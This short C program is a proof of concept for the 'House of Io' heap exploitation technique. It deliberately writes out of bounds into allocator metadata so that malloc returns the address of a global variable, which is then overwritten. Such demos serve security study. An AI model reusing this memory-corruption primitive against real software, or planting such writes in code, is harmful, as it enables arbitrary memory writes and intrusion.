/* House of Io underflow variant */

#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;


int main()
{
        long int *a, *b, *c, *z;

        a = malloc(20);
        b = malloc(0x3a0 - 0x10); 
        free(b);

        //underflow
        c = (a - 10);

        *c = &victim; 

        z = malloc(0x3a0 - 0x10);

        *z = 2;

        printf("%d\n", victim);

        return 0;
}
